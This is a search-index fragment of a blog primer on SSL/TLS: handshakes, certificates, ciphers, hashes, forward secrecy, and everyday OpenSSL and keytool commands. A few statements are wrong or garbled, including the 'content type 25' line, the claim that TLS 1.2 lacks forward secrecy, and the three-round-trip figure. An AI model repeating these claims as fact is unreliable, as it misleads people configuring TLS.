SSL/TLS?"},{"location":"Blog/2021-08-26-An-SSL-Primer/#the-basic-tls-handshake","text":"A typical connection example follows, illustrating a handshake where the server (but not the client) is authenticated by its certificate: Negotiation phase A client sends a ClientHello message specifying the highest TLS protocol version it supports, a random number, a list of suggested cipher suites and suggested compression methods. If the client is attempting to perform a resumed handshake, it may send a session ID. If the client can use Application-Layer Protocol Negotiation, it may include a list of supported application protocols, such as HTTP/2. The server responds with a ServerHello message, containing the chosen protocol version, a random number, cipher suite and compression method from the choices offered by the client. To confirm or allow resumed handshakes the server may send a session ID. The chosen protocol version should be the highest that both the client and server support. For example, if the client supports TLS version 1.1 and the server supports version 1.2, version 1.1 should be selected; version 1.2 should not be selected. The server sends its Certificate message (depending on the selected cipher suite, this may be omitted by the server). The server sends its ServerKeyExchange message (depending on the selected cipher suite, this may be omitted by the server). This message is sent for all DHE and DH_anon cipher suites. The server sends a ServerHelloDone message, indicating it is done with handshake negotiation. The client responds with a ClientKeyExchange message, which may contain a PreMasterSecret, public key, or nothing. (Again, this depends on the selected cipher.) This PreMasterSecret is encrypted using the public key of the server certificate. The client and server then use the random numbers and PreMasterSecret to compute a common secret, called the \"master secret\". All other key data for this connection is derived from this master secret (and the client- and server-generated random values), which is passed through a carefully designed pseudorandom function. The client now sends a ChangeCipherSpec record, essentially telling the server, \"Everything I tell you from now on will be authenticated (and encrypted if encryption parameters were present in the server certificate).\" The ChangeCipherSpec is itself a record-level protocol with content type of 20. The client sends an authenticated and encrypted Finished message, containing a hash and MAC over the previous handshake messages. The server will attempt to decrypt the client's Finished message and verify the hash and MAC. If the decryption or verification fails, the handshake is considered to have failed and the connection should be torn down. Finally, the server sends a ChangeCipherSpec, telling the client, \"Everything I tell you from now on will be authenticated (and encrypted, if encryption was negotiated).\" The server sends its authenticated and encrypted Finished message. The client performs the same decryption and verification procedure as the server did in the previous step. Application phase At this point in the process the \"handshake\" is complete and the application protocol is enabled, with content type of 23. Application messages exchanged between client and server will also be authenticated and optionally encrypted exactly like in their Finished message. Otherwise, the content type will return 25 and the client will not authenticate.","title":"The Basic TLS Handshake"},{"location":"Blog/2021-08-26-An-SSL-Primer/#the-client-authenticated-tls-handshake","text":"a.k.a Mutual Authentication a.k.a mAuth a.k.a mTLS a.k.a 2 Way SSL/TLS The following full example shows a client being authenticated (in addition to the server as in the example above) via TLS using certificates exchanged between both peers. Negotiation Phase A client sends a ClientHello message specifying the highest TLS protocol version it supports, a random number, a list of suggested cipher suites and compression methods. The server responds with a ServerHello message, containing the chosen protocol version, a random number, cipher suite and compression method from the choices offered by the client. The server may also send a session id as part of the message to perform a resumed handshake. The server sends its Certificate message (depending on the selected cipher suite, this may be omitted by the server). The server sends its ServerKeyExchange message (depending on the selected cipher suite, this may be omitted by the server). This message is sent for all DHE and DH_anon ciphersuites. The server sends a CertificateRequest message, to request a certificate from the client so that the connection can be mutually authenticated. The server sends a ServerHelloDone message, indicating it is done with handshake negotiation. The client responds with a Certificate message, which contains the client's certificate. The client sends a ClientKeyExchange message, which may contain a PreMasterSecret, public key, or nothing. (Again, this depends on the selected cipher.) This PreMasterSecret is encrypted using the public key of the server certificate. The client sends a CertificateVerify message, which is a signature over the previous handshake messages using the client's certificate's private key. This signature can be verified by using the client's certificate's public key. This lets the server know that the client has access to the private key of the certificate and thus owns the certificate. The client and server then use the random numbers and PreMasterSecret to compute a common secret, called the \"master secret\". All other key data for this connection is derived from this master secret (and the client- and server-generated random values), which is passed through a carefully designed pseudorandom function. The client now sends a ChangeCipherSpec record, essentially telling the server, \"Everything I tell you from now on will be authenticated (and encrypted if encryption was negotiated). \" The ChangeCipherSpec is itself a record-level protocol and has type 20 and not 22. Finally, the client sends an encrypted Finished message, containing a hash and MAC over the previous handshake messages. The server will attempt to decrypt the client's Finished message and verify the hash and MAC. If the decryption or verification fails, the handshake is considered to have failed and the connection should be torn down. Finally, the server sends a ChangeCipherSpec, telling the client, \"Everything I tell you from now on will be authenticated (and encrypted if encryption was negotiated). \" The server sends its own encrypted Finished message. The client performs the same decryption and verification procedure as the server did in the previous step. Application phase At this point in the process the \"handshake\" is complete and the application protocol is enabled, with content type of 23. Application messages exchanged between client and server will also be encrypted exactly like in their Finished message.","title":"The Client-authenticated TLS Handshake"},{"location":"Blog/2021-08-26-An-SSL-Primer/#the-tls-13-handshake","text":"The TLS 1.3 handshake process involves only one round-trip as opposed to three in TLS 1.2. This results in reduced latency. Similar to the TLS 1.2 handshake, the TLS 1.3 handshake commences with the \u201cClient Hello\u201d message \u2013 with one significant change. The client sends the list of supported cypher suites and guesses which key agreement protocol the server is likely to select. The client also sends its key share for that particular key agreement protocol. In reply to the \u201cClient Hello\u201d message, the server replies with the key agreement protocol that it has chosen. The \u201cServer Hello\u201d message also comprises of the server\u2019s key share, its certificate as well as the \u201cServer Finished\u201d message. The \u201cServer Finished\u201d message, which was sent in the 6th step in TLS 1.2 handshake, is sent in the second step. Thereby, saving four steps and one round trip along the way. Now, the client checks the server certificate, generates keys as it has the key share of the server, and sends the \u201cClient Finished\u201d message. From here on, the encryption of the data begins. This way, the TLS 1.3 handshake saves an entire round-trip and hundreds of milliseconds. A major improvement over the TLS 1.2 handshake. 0-RTT Resumption: The Good Another major milestone that TLS 1.3 is set to accomplish is 0-RTT Resumption. It means that if the client has connected to the server before, TLS 1.3 permits a zero-round trip handshake. This is accomplished by storing secret information (typically, Session ID or Session Tickets) of previous sessions and using them when both parties connect with each other in future. 0-RTT Resumption: The Bad However, there are few concerns when it comes to the security in 0-RTT resumption sessions. The first being the lack of full forward secrecy. It means that if these session ticket keys are compromised, an attacker can decrypt the 0-RTT data sent by the client on the first flight. Of course, this can easily be avoided by rotating session keys regularly. But considering TLS 1.2 doesn\u2019t support full forward secrecy at all, TLS 1.3 is definitely an improvement. The second security concern when it comes to TLS 1.3 0-RTT is that it doesn\u2019t provide a guarantee of non-replay between connections. If an attacker somehow manages to get hold of your 0-RTT encrypted data, it can fool the server into believing that the request came from the server since it has no way of knowing where the data came from. If an attacker sends this request multiple times, it\u2019s called \u2018replay attack.\u2019 It\u2019s not as easy as it sounds and obviously, there are certain mechanisms to prevent that.","title":"The TLS 1.3 Handshake"},{"location":"Blog/2021-08-26-An-SSL-Primer/#common-filetypes","text":"There are several commonly used filename extensions for X.509 certificates. Unfortunately, some of these extensions are also used for other data such as private keys. .pem \u2013 (Privacy-enhanced Electronic Mail) Base64 encoded DER certificate, enclosed between \"-----BEGIN CERTIFICATE-----\" and \"-----END CERTIFICATE-----\" .cer, .crt, .der \u2013 usually in binary DER form, but Base64-encoded certificates are common too (see .pem above) .p7b, .p7c \u2013 PKCS#7 Signed Data structure without data, just certificate(s) or CRL(s) .p12 \u2013 PKCS#12, may contain certificate(s) (public) and private keys (password protected) .pfx \u2013 PFX, predecessor of PKCS#12 (usually contains data in PKCS#12 format, e.g., with PFX files generated in IIS) .jks - Java KeyStore is a repository of security certificates \u2013 either authorization certificates or public key certificates \u2013 plus corresponding private keys, used for instance in SSL encryption. In IBM WebSphere Application Server and Oracle WebLogic Server, a file with extension jks serves as a keystore. The Java Development Kit maintains a CA keystore file named cacerts in folder jre/lib/security. JDKs provide a tool named keytool to manipulate the keystore. keytool has no functionality to extract the private key out of the keystore, but this is possible with third-party tools like jksExportKey, CERTivity, Portecle and KeyStore Explorer.","title":"Common Filetypes"},{"location":"Blog/2021-08-26-An-SSL-Primer/#certificate-authorities","text":"In cryptography, a certificate authority or certification authority (CA) is an entity that issues digital certificates. A digital certificate certifies the ownership of a public key by the named subject of the certificate. This allows others (relying parties) to rely upon signatures or on assertions made about the private key that corresponds to the certified public key. A CA acts as a trusted third party\u2014trusted both by the subject (owner) of the certificate and by the party relying upon the certificate. The format of these certificates is specified by the X.509 or EMV standard. A CA issues digital certificates that contain a public key and the identity of the owner. The matching private key is not made available publicly, but kept secret by the end user who generated the key pair. The certificate is also a confirmation or validation by the CA that the public key contained in the certificate belongs to the person, organization, server or other entity noted in the certificate. A CA's obligation in such schemes is to verify an applicant's credentials, so that users and relying parties can trust the information in the CA's certificates. CAs use a variety of standards and tests to do so. In essence, the certificate authority is responsible for saying \"yes, this person is who they say they are, and we, the CA, certify that\". If the user trusts the CA and can verify the CA's signature, then they can also assume that a certain public key does indeed belong to whoever is identified in the certificate.","title":"Certificate Authorities"},{"location":"Blog/2021-08-26-An-SSL-Primer/#chains-of-trust","text":"A chain of trust is designed to allow multiple users to create and use software on the system, which would be more difficult if all the keys were stored directly in hardware. It starts with hardware that will only boot from software that is digitally signed. The signing authority will only sign boot programs that enforce security, such as only running programs that are themselves signed, or only allowing signed code to have access to certain features of the machine. This process may continue for several layers. This process results in a chain of trust. The final software can be trusted to have certain properties, because if it had been illegally modified its signature would be invalid, and the previous software would not have executed it. The previous software can be trusted, because it, in turn, would not have been loaded if its signature had been invalid. The trustworthiness of each layer is guaranteed by the one before, back to the trust anchor. It would be possible to have the hardware check the suitability (signature) for every single piece of software. However, this would not produce the flexibility that a \"chain\" provides. In a chain, any given link can be replaced with a different version to provide different properties, without having to go all the way back to the trust anchor. This use of multiple layers is an application of a general technique to improve scalability, and is analogous to the use of multiple certificates in a certificate chain.","title":"Chains of Trust"},{"location":"Blog/2021-08-26-An-SSL-Primer/#encryption-schemas","text":"Encryption Schemas can be broken down into 2 main categories block ciphers and steam ciphers","title":"Encryption Schemas"},{"location":"Blog/2021-08-26-An-SSL-Primer/#block-ciphers","text":"A block cipher is a deterministic algorithm operating on fixed-length groups of bits, called blocks. It uses an unvarying transformation, that is, it uses a symmetric key. They are specified elementary components in the design of many cryptographic protocols and are widely used to implement the encryption of large amounts of data, including data exchange protocols. Even a secure block cipher is suitable only for the encryption of a single block of data at a time, using a fixed key. A multitude of modes of operation have been designed to allow their repeated use in a secure way, to achieve the security goals of confidentiality and authenticity. However, block ciphers may also feature as building blocks in other cryptographic protocols, such as universal hash functions and pseudo-random number generators.","title":"Block ciphers"},{"location":"Blog/2021-08-26-An-SSL-Primer/#notable-block-ciphers","text":"Lucifer / DES Lucifer is generally considered to be the first civilian block cipher, developed at IBM in the 1970s based on work done by Horst Feistel. A revised version of the algorithm was adopted as a U.S. government Federal Information Processing Standard: FIPS PUB 46 Data Encryption Standard (DES). It was chosen by the U.S. National Bureau of Standards (NBS) after a public invitation for submissions and some internal changes by NBS (and, potentially, the NSA). DES was publicly released in 1976 and has been widely used. DES was designed to, among other things, resist a certain cryptanalytic attack known to the NSA and rediscovered by IBM, though unknown publicly until rediscovered again and published by Eli Biham and Adi Shamir in the late 1980s. The technique is called differential cryptanalysis and remains one of the few general attacks against block ciphers; linear cryptanalysis is another, but may have been unknown even to the NSA, prior to its publication by Mitsuru Matsui. DES prompted a large amount of other work and publications in cryptography and cryptanalysis in the open community and it inspired many new cipher designs. DES has a block size of 64 bits and a key size of 56 bits. 64-bit blocks became common in block cipher designs after DES. Key length depended on several factors, including government regulation. Many observers in the 1970s commented that the 56-bit key length used for DES was too short. As time went on, its inadequacy became apparent, especially after a special purpose machine designed to break DES was demonstrated in 1998 by the Electronic Frontier Foundation. An extension to DES, Triple DES, triple-encrypts each block with either two independent keys (112-bit key and 80-bit security) or three independent keys(168-bit key and 112-bit security). It was widely adopted as a replacement. As of 2011, the three-key version is still considered secure, though the National Institute of Standards and Technology (NIST) standards no longer permit the use of the two-key version in new applications, due to its 80-bit security level. As of https://tools.ietf.org/html/rfc8996 the Single DES block cipher is deprecated and should not be used. 3DES or Triple DES are still allowed as of this RFC. IDEA The International Data Encryption Algorithm (IDEA) is a block cipher designed by James Massey of ETH Zurich and Xuejia Lai; it was first described in 1991, as an intended replacement for DES. IDEA operates on 64-bit blocks using a 128-bit key, and consists of a series of eight identical transformations (a round) and an output transformation (the half-round). The processes for encryption and decryption are similar. IDEA derives much of its security by interleaving operations from different groups \u2013 modular addition and multiplication, and bitwise exclusive or (XOR) \u2013 which are algebraically \"incompatible\" in some sense. The designers analyzed IDEA to measure its strength against differential cryptanalysis and concluded that it is immune under certain assumptions. No successful linear or algebraic weaknesses have been reported. As of 2012, the best attack which applies to all keys can break full 8.5-round IDEA using a narrow-bicliques attack about four times faster than brute force. As of https://tools.ietf.org/html/rfc8996 the IDEA block cipher is deprecated and should not be used RC5 RC5 is a block cipher designed by Ronald Rivest in 1994 which, unlike many other ciphers, has a variable block size (32, 64 or 128 bits), key size (0 to 2040 bits) and number of rounds (0 to 255). The original suggested choice of parameters were a block size of 64 bits, a 128-bit key and 12 rounds. A key feature of RC5 is the use of data-dependent rotations; one of the goals of RC5 was to prompt the study and evaluation of such operations as a cryptographic primitive. RC5 also consists of a number of modular additions and XORs. The general structure of the algorithm is a Feistel-like network. The encryption and decryption routines can be specified in a few lines of code. The key schedule, however, is more complex, expanding the key using an essentially one-way function with the binary expansions of both e and the golden ratio as sources of \"nothing up my sleeve numbers\". The tantalizing simplicity of the algorithm together with the novelty of the data-dependent rotations has made RC5 an attractive object of study for cryptanalysts.12-round RC5 (with 64-bit blocks) is susceptible to a differential attack using 244 chosen plaintexts. 18\u201320 rounds are suggested as sufficient protection. Rijndael / AES The Rijndael cipher developed by Belgian cryptographers, Joan Daemen and Vincent Rijmen was one of the competing designs to replace DES. It won the 5-year public competition to become the AES, (Advanced Encryption Standard). Adopted by NIST in 2001, AES has a fixed block size of 128 bits and a key size of 128, 192, or 256 bits, whereas Rijndael can be specified with block and key sizes in any multiple of 32 bits, with a minimum of 128 bits. The blocksize has a maximum of 256 bits, but the keysize has no theoretical maximum. AES operates on a 4\u00d74 column-major order matrix of bytes, termed the state (versions of Rijndael with a larger block size have additional columns in the state). Blowfish Blowfish is a block cipher, designed in 1993 by Bruce Schneier and included in a large number of cipher suites and encryption products. Blowfish has a 64-bit block size and a variable key length from 1 bit up to 448 bits. It is a 16-round Feistel cipher and uses large key-dependent Sboxes. Notable features of the design include the key-dependent S-boxes and a highly complex key schedule. It was designed as a general-purpose algorithm, intended as an alternative to the ageing DES and free of the problems and constraints associated with other algorithms. At the time Blowfish was released, many other designs were proprietary, encumbered by patents or were commercial/government secrets. Schneier has stated that, \"Blowfish is unpatented, and will remain so in all countries. The algorithm is hereby placed in the public domain, and can be freely used by anyone.\" The same applies to Twofish, a successor algorithm from Schneier.","title":"Notable Block Ciphers"},{"location":"Blog/2021-08-26-An-SSL-Primer/#stream-ciphers","text":"A stream cipher is a symmetric key cipher where plaintext digits are combined with a pseudorandom cipher digit stream (keystream). In a stream cipher, each plaintext digit is encrypted one at a time with the corresponding digit of the keystream, to give a digit of the ciphertext stream. Since encryption of each digit is dependent on the current state of the cipher, it is also known as state cipher. In practice, a digit is typically a bit and the combining operation is an exclusive-or (XOR). The pseudorandom keystream is typically generated serially from a random seed value using digital shift registers. The seed value serves as the cryptographic key for decrypting the ciphertext stream. Stream ciphers represent a different approach to symmetric encryption from block ciphers. Block ciphers operate on large blocks of digits with a fixed, unvarying transformation. This distinction is not always clear-cut: in some modes of operation, a blockcipher primitive is used in such a way that it acts effectively as a stream cipher. Stream ciphers typically execute at a higher speed than block ciphers and have lower hardware complexity. However, stream ciphers can be susceptible to serious security problems if used incorrectly (see stream cipher attacks); in particular, the same starting state (seed) must never be used twice. Stream ciphers are often used for their speed and simplicity of implementation in hardware, and in applications where plaintext comes in quantities of unknowable length like a secure wireless connection. If a block cipher (not operating in a stream cipher mode) were to be used in this type of application, the designer would need to choose either transmission efficiency or implementation complexity, since block ciphers cannot directly work on blocks shorter than their block size. For example, if a 128-bit block cipher received separate 32-bit bursts of plaintext, three quarters of the data transmitted would be padding. Block ciphers must be used in ciphertext stealing or residual block termination mode to avoid padding, while stream ciphers eliminate this issue by naturally operating on the smallest unit that can be transmitted (usually bytes). Another advantage of stream ciphers in military cryptography is that the cipher stream can be generated in a separate box that is subject to strict security measures and fed to other devices such as a radio set, which will perform the xor operation as part of their function. The latter device can then be designed and used in less stringent environments. ChaCha is becoming the most widely used stream cipher in software; others include: RC4, A5/1, A5/2, Chameleon, FISH, Helix, ISAAC, MUGI, Panama, Phelix, Pike, Salsa20, SEAL, SOBER, SOBER-128, and WAKE.","title":"Stream ciphers"},{"location":"Blog/2021-08-26-An-SSL-Primer/#hashing-functions","text":"There are many cryptographic hash algorithms; this section lists a few algorithms that are referenced relatively often. A more extensive list can be found on the page containing a comparison of cryptographic hash functions. MD5 MD5 was designed by Ronald Rivest in 1991 to replace an earlier hash function MD4, and was specified in 1992 as https://www.ietf.org/rfc/rfc1321.txt . Collisions against MD5 can be calculated within seconds which makes the algorithm unsuitable for most use cases where a cryptographic hash is required. MD5 produces a digest of 128 bits (16 bytes). SHA-1 SHA-1 was developed as part of the U.S. Government's Capstone project. The original specification \u2013 now commonly called SHA-0 \u2013 of the algorithm was published in 1993 under the title Secure Hash Standard, FIPS PUB 180, by U.S. government standards agency NIST (National Institute of Standards and Technology). It was withdrawn by the NSA shortly after publication and was superseded by the revised version, published in 1995 in FIPS PUB 180-1 and commonly designated SHA-1. Collisions against the full SHA-1 algorithm can be produced using the shattered attack and the hash function should be considered broken. SHA-1 produces a hash digest of 160 bits (20 bytes). Documents may refer to SHA-1 as just \"SHA\", even though this may conflict with the other Standard Hash Algorithms such as SHA-0, SHA-2 and SHA-3. RIPEMD-160 RIPEMD (RACE Integrity Primitives Evaluation Message Digest) is a family of cryptographic hash functions developed in Leuven, Belgium, by Hans Dobbertin, Antoon Bosselaers and Bart Preneel at the COSIC research group at the Katholieke Universiteit Leuven, and first published in 1996. RIPEMD was based upon the design principles used in MD4, and is similar in performance to the more popular SHA-1. RIPEMD-160 has however not been broken. As the name implies, RIPEMD-160 produces a hash digest of 160 bits (20 bytes). Whirlpool Whirlpool is a cryptographic hash function designed by Vincent Rijmen and Paulo S. L. M. Barreto, who first described it in 2000. Whirlpool is based on a substantially modified version of the Advanced Encryption Standard (AES). Whirlpool produces a hash digest of 512 bits (64 bytes). SHA-2 SHA-2 (Secure Hash Algorithm 2) is a set of cryptographic hash functions designed by the United States National Security Agency (NSA), first published in 2001. They are built using the Merkle\u2013Damg\u00e5rd structure, from a one-way compression function itself built using the Davies\u2013 Meyer structure from a (classified) specialized block cipher. SHA-2 basically consists of two hash algorithms: SHA-256 and SHA-512. SHA-224 is a variant of SHA-256 with different starting values and truncated output. SHA-384 and the lesser known SHA-512/224 and SHA-512/256 are all variants of SHA-512. SHA-512 is more secure than SHA-256 and is commonly faster than SHA-256 on 64 bit machines such as AMD64. The output size in bits is given by the extension to the \"SHA\" name, so SHA-224 has an output size of 224 bits (28 bytes), SHA-256 produces 32 bytes, SHA-384 produces 48 bytes and finally SHA-512 produces 64 bytes. SHA-3 SHA-3 (Secure Hash Algorithm 3) was released by NIST on August 5, 2015. SHA-3 is a subset of the broader cryptographic primitive family Keccak. The Keccak algorithm is the work of Guido Bertoni, Joan Daemen, Michael Peeters, and Gilles Van Assche. Keccak is based on a sponge construction which can also be used to build other cryptographic primitives such as a stream cipher. SHA-3 provides the same output sizes as SHA-2: 224, 256, 384 and 512 bits. Configurable output sizes can also be obtained using the SHAKE-128 and SHAKE-256 functions. Here the -128 and -256 extensions to the name imply the security strength of the function rather than the output size in bits. BLAKE2 An improved version of BLAKE called BLAKE2 was announced on December 21, 2012. It was created by Jean-Philippe Aumasson, Samuel Neves, Zooko Wilcox-O'Hearn, and Christian Winnerlein with the goal of replacing the widely used but broken MD5 and SHA-1 algorithms. When run on 64-bit x64 and ARM architectures, BLAKE2b is faster than SHA-3, SHA-2, SHA- 1, and MD5. Although BLAKE and BLAKE2 have not been standardized as SHA-3 has, BLAKE2 has been used in many protocols including the Argon2 password hash, for the high efficiency that it offers on modern CPUs. As BLAKE was a candidate for SHA-3, BLAKE and BLAKE2 both offer the same output sizes as SHA-3 \u2013 including a configurable output size. BLAKE3 BLAKE3, an improved version of BLAKE2, was announced on January 9, 2020. It was created by Jack O'Connor, Jean-Philippe Aumasson, Samuel Neves, and Zooko Wilcox-O'Hearn. BLAKE3 is a single algorithm, in contrast to BLAKE and BLAKE2, which are algorithm families with multiple variants. The BLAKE3 compression function is closely based on that of BLAKE2s, with the biggest difference being that the number of rounds is reduced from 10 to 7. Internally, BLAKE3 is a Merkle tree, and it supports higher degrees of parallelism than BLAKE2.","title":"Hashing Functions"},{"location":"Blog/2021-08-26-An-SSL-Primer/#forward-secrecy","text":"Forward Secrecy (FS), also known as Perfect Forward Secrecy (PFS), is a feature of specific key agreement protocols that gives assurances that session keys will not be compromised even if long-term secrets used in the session key exchange are compromised. For HTTPS the long-term secret is typically the private signing key of the server. Forward secrecy protects past sessions against future compromises of keys or passwords. By generating a unique session key for every session a user initiates, the compromise of a single session key will not affect any data other than that exchanged in the specific session protected by that particular key. This by itself is not sufficient for forward secrecy which additionally requires that a long-term secret compromise does not affect the security of past session keys. Forward secrecy protects data on the transport layer of a network that uses common SSL/TLS protocols, including OpenSSL, when its long-term secret keys are compromised, as with the Heartbleed security bug. If forward secrecy is used, encrypted communications and sessions recorded in the past cannot be retrieved and decrypted should long-term secret keys or passwords be compromised in the future, even if the adversary actively interfered, for example via a man-in-the-middle attack. The value of forward secrecy is that it protects past communication. This reduces the motivation for attackers to compromise keys. For instance, if an attacker learns a long-term key, but the compromise is detected and the long-term key is revoked and updated, relatively little information is leaked in a forward secure system. The value of forward secrecy depends on the assumed capabilities of an adversary. Forward secrecy has value if an adversary is assumed to be able to obtain secret keys from a device (read access) but is either detected or unable to modify the way session keys are generated in the device (full compromise). In some cases an adversary who can read long-term keys from a device may also be able to modify the functioning of the session key generator, as in the backdoored Dual Elliptic Curve Deterministic Random Bit Generator. Forward security offers no protection once such a compromise occurred.","title":"Forward Secrecy"},{"location":"Blog/2021-08-26-An-SSL-Primer/#common-tools","text":"","title":"Common Tools"},{"location":"Blog/2021-08-26-An-SSL-Primer/#openssl","text":"OpenSSL is a software library for applications that secure communications over computer networks against eavesdropping or need to identify the party at the other end. It is widely used by Internet servers, including the majority of HTTPS websites. OpenSSL contains an open-source implementation of the SSL and TLS protocols. The core library, written in the C programming language, implements basic cryptographic functions and provides various utility functions. Wrappers allowing the use of the OpenSSL library in a variety of computer languages are available. The OpenSSL Software Foundation (OSF) represents the OpenSSL project in most legal capacities including contributor license agreements, managing donations, and so on. OpenSSL Software Services (OSS) also represents the OpenSSL project, for Support Contracts. OpenSSL is available for most Unix-like operating systems (including Linux, macOS, and BSD) and Microsoft Windows. OpenSSL supports a number of different cryptographic algorithms: Ciphers AES, Blowfish, Camellia, Chacha20, Poly1305, SEED, CAST-128, DES, IDEA, RC2, RC4, RC5, Triple DES, GOST 28147-89, SM4 Cryptographic hash functions MD5, MD4, MD2, SHA-1, SHA-2, SHA-3, RIPEMD-160, MDC-2, GOST R 34.11-94, BLAKE2, Whirlpool, SM3 Public-key cryptography RSA, DSA, Diffie\u2013Hellman key exchange, Elliptic curve, X25519, Ed25519, X448, Ed448, GOST R 34.10-2001, SM2(Perfect forward secrecy is supported using elliptic curve Diffie\u2013Hellman since version 1.0.) As of December 2012, OpenSSL is one of two open source programs involved in validation under the FIPS 140-2 computer security standard by the National Institute of Standards and Technology's (NIST) Cryptographic Module Validation Program (CMVP). (OpenSSL itself is not validated, but a component called the OpenSSL FIPS Object Module, based on OpenSSL, was created to provide many of the same capabilities). A certificate was first awarded in January 2006 but revoked in July 2006 \"when questions were raised about the validated module's interaction with outside software.\" The certification was reinstated in February 2007. Command examples The following are some OpenSSL command examples you can use to help troubleshoot your certificate implementations This command will attempt to open an SSL/TLS tunnel from the node that runs it to nodename.mydomain.com on port 443. In a successful state you should see any SSL/TLS Cert applied to nodename.mydomain.com:443 to be presented in your terminal. In a failure state you should see an error displayed. openssl s_client -connect google.com:443 View full X.509 data for a certificate openssl s_client -connect google.com:443 2>/dev/null | openssl x509 -text Convert a DER file (.crt .cer .der) to PEM openssl x509 -inform der -in certificate.cer -out certificate.pem Convert a PEM file to DER openssl x509 -in certificate.pem -out certificate.der -outform der Convert a PKCS#12 file ( .pfx .p12 ) containing a private key and certificates to PEM openssl pkcs12 -in keyStore.pfx -out keyStore.pem -nodes Encrypt a sting with the password \"Password\" echo \"Super secret squrrels\" | openssl enc -aes-256-cbc -a -e -pass pass:Password -pbkdf2 Decrypt a string with the password \"Password\" echo \"U2FsdGVkX1//raN1Fube79JCWsXlRbzrla7W1BRJuicrdMZEOFHiNCL1K9Pfm3XY\" | openssl enc -aes-256-cbc -a -d -pass pass:Password -pbkdf2 Check an MD5 hash of the public key to ensure that it matches with what is in a CSR or private key openssl x509 -noout -modulus -in certificate.crt | openssl md5 openssl rsa -noout -modulus -in privateKey.key | openssl md5 openssl req -noout -modulus -in CSR.csr | openssl md5 Generate a new private key and Certificate Signing Request openssl req -out CSR.csr -new -newkey rsa:2048 -nodes -keyout privateKey.key Generate a self-signed certificate openssl req -x509 -sha256 -nodes -days 365 -newkey rsa:2048 -keyout privateKey.key -out certificate.crt Generate a certificate signing request (CSR) for an existing private key openssl req -out certificate.csr -key privateKey.key -new Generate a certificate signing request based on an existing certificate openssl x509 -x509toreq -in certificate.crt -out CSR.csr -signkey privateKey.key Remove a passphrase from a private key openssl rsa -in privateKey.pem -out newPrivateKey.pem","title":"OpenSSL"},{"location":"Blog/2021-08-26-An-SSL-Primer/#keytool","text":"The keytool command is a key and certificate management utility. It enables users to administer their own public/private key pairs and associated certificates for use in self-authentication (where a user authenticates themselves to other users and services) or data integrity and authentication services, by using digital signatures. The keytool command also enables users to cache the public keys (in the form of certificates) of their communicating peers. A certificate is a digitally signed statement from one entity (person, company, and so on), which says that the public key (and some other information) of some other entity has a particular value. When data is digitally signed, the signature can be verified to check the data integrity and authenticity. Integrity means that the data hasn't been modified or tampered with, and authenticity means that the data comes from the individual who claims to have created and signed it. The keytool command also enables users to administer secret keys and passphrases used in symmetric encryption and decryption (Data Encryption Standard). It can also display other security-related information. The keytool command stores the keys and certificates in a keystore. While keytool is invaluable in manipulating JKS Keystores it should be noted that while the JKS format is easy to implement in a Java program it is both a proprietary format and depreciated by Oracle. If given the option adopting the X.509 Standard in its place is the best practice. Command examples Generate a Java keystore and key pair keytool -genkey -alias mydomain -keyalg RSA -keystore keystore.jks -keysize 2048 Generate a certificate signing request (CSR) for an existing Java keystore keytool -certreq -alias mydomain -keystore keystore.jks -file mydomain.csr Import a root or intermediate CA certificate to an existing Java keystore keytool -import -trustcacerts -alias root -file Thawte.crt -keystore keystore.jks Import a signed primary certificate to an existing Java keystore keytool -import -trustcacerts -alias mydomain -file mydomain.crt -keystore keystore.jks Generate a keystore and self-signed certificate keytool -genkey -keyalg RSA -alias selfsigned -keystore keystore.jks -storepass password -validity 360 -keysize 2048 Check a stand-alone certificate keytool -printcert -v -file mydomain.crt Check which certificates are in a Java keystore keytool -list -v -keystore keystore.jks Check a particular keystore entry using an alias keytool -list -v -keystore keystore.jks -alias mydomain Delete a certificate from a Java Keytool keystore keytool -delete -alias mydomain -keystore keystore.jks Change a Java keystore password keytool -storepasswd -new new_storepass -keystore keystore.jks Export a certificate from a keystore keytool -export -alias mydomain -file mydomain.crt -keystore keystore.jks List Trusted CA Certs keytool -list -v -keystore $JAVA_HOME/jre/lib/security/cacerts Import New CA into Trusted Certs keytool -import -trustcacerts -file /path/to/ca/ca.pem -alias CA_ALIAS -keystore $JAVA_HOME/jre/lib/","title":"Keytool"},{"location":"Blog/2021-08-26-An-SSL-Primer/#implementing-ssltls-on-your-solution","text":"A method for adoption","title":"Implementing SSL/TLS on your solution"},{"location":"Blog/2021-08-26-An-SSL-Primer/#phase-1","text":"Each application that will be adopting SSL/TLS will need to have 3 local ports defined for it. A port for unencrypted traffic so that other solutions calling it don't break during the implementation steps A port for encrypted traffic for a Basic SSL/TLS Handshake that does not require Mutual Authentication A port for encrypted traffic for a Mutual Authentication SSL/TLS Handshake Additionally work needed to be scoped to ensure that the application to be encrypted can be supported and any necessary code changes can start to be developed. Now its time to request some certificates. In an ideal situation each node in the environment would have its own personal certificate however once your environments begin to grow you may find that approach unwieldy as each certificate would have to be managed independently and can be a nightmare to implement when scaled. This can be worked around with liberal application of the Subject Alternate Name (SAN) field in the X.509 Standard. By leveraging this an entire stack of nodes can share the same certificate across common nodes without having the drawback of managing a huge amount of certificates. The Catch-22 of this strategy is that in the event that this certificate either expires or becomes compromised a redeployment of a different certificate with the same properties would have to be implemented to restore system functionality across each node this certificate is signed for. An example of this follows. Use the strategy that works best for your solution. Given a 3 node stack (example1.mydomain.com(10.0.0.1), example2.mydomain.com(10.0.0.2), example3.mydomain.com(10.0.0.3)) a certificate that would be valid for these nodes would contain the following SAN data DNS: example1.mydomain.com DNS: example1 IP: 10.0.0.1 DNS: example2.mydomain.com DNS: example2 IP: 10.0.0.2 DNS: example3.mydomain.com DNS: example3 IP: 10.0.0.3 Note that each DNS record and IP are recorded as separate entity's in the SAN field also note that there is a distinction between between fully qualified domain names (FQDN) and short names for each node in the stack and they all need to be explicitly defined Keystores, Truststores and how to play nice with multiple environments Keystores are certificate bundles that are encrypted and contain the private key and certificate chain your application will be using to encrypt its traffic for the purposes of SSL. Being encrypted they will require a password that your application must pass to it to leverage the key stored within. These passwords are sensitive and should be treated the same as any other password do not leave them in unencrypted formats on code repositories or config files. Truststores are certificate bundles that may or may not be encrypted that contain public keys of certificate authorities your application can trust this will most likely contain the public keys for your companies Certificate Authorities as well as the CA's for any third party your application may be connecting to outside of your company. Generic CA Bundles are certificate bundles for common External Certificate Authorities (Digicert, Entrust, etc.) like the Truststores but come prepackaged within the installation of Operating Systems or application frameworks like Java. These are generally safe to trust and change with updated packages or standard patching processes. Note that any modifications you make to Generic CA bundles will not persist as these packages are upgraded in the future and modifying them while possible is not considered best practice.","title":"Phase 